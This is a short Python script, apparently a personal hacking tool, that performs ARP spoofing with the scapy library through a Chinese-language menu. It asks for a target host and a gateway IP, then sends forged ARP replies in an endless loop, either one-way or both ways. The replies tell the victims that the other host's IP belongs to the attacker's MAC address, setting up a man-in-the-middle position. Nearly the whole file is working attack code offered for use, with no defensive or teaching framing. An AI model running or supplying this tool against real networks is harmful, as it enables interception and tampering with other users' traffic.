# -*- coding = utf-8 -*-
# @Time:2024/5/31 20:07
# @Author:ck
# @File:ARP_Deception
# @Software:PyCharm
from scapy.all import *
from scapy.layers.l2 import ARP
import time

def get_mac_address():
    import uuid
    node = uuid.getnode()
    mac = uuid.UUID(int=node).hex[-12:]
    MAC = ":".join([mac[e:e + 2] for e in range(0, 11, 2)])
    return MAC

print(get_mac_address())

def dx(IP1, IP2):
    a = get_mac_address()
    pkt = ARP(psrc=IP1, hwsrc=a, pdst=IP2, op=2)
    oldPrint = sys.stdout
    sys.stdout = open('trash.txt', 'w')
    send(pkt)
    sys.stdout = oldPrint
    print(f"{a} : 告诉{IP2},{IP1} 的MAC地址是{a}")

def fx(IP1, IP2):
    a = get_mac_address()
    pkt = ARP(psrc=IP2, hwsrc=a, pdst=IP1, op=2)
    oldPrint = sys.stdout
    sys.stdout = open('trash.txt', 'a+')
    send(pkt, iface="en0")
    sys.stdout = oldPrint
    print(f"{a} : 告诉{IP1}   {IP2} 的MAC地址是{a}")

print("*" * 25 + "ARP欺骗" + "*" * 25)
a = int(input("【1】单向欺骗【2】双向欺骗【0】退出:"))
if a == 1:
    IP1 = input("请输入要攻击的主机IP:")
    IP2 = input("请输被欺骗的主机IP/网关:")
    while True:
        dx(IP1, IP2)
        time.sleep(1)
elif a == 2:
    IP1 = input("请输入IP1:")
    IP2 = input("请输入IP2:")
    while True:
        dx(IP1, IP2)
        fx(IP1, IP2)
        time.sleep(0.1)
else:
    exit(0)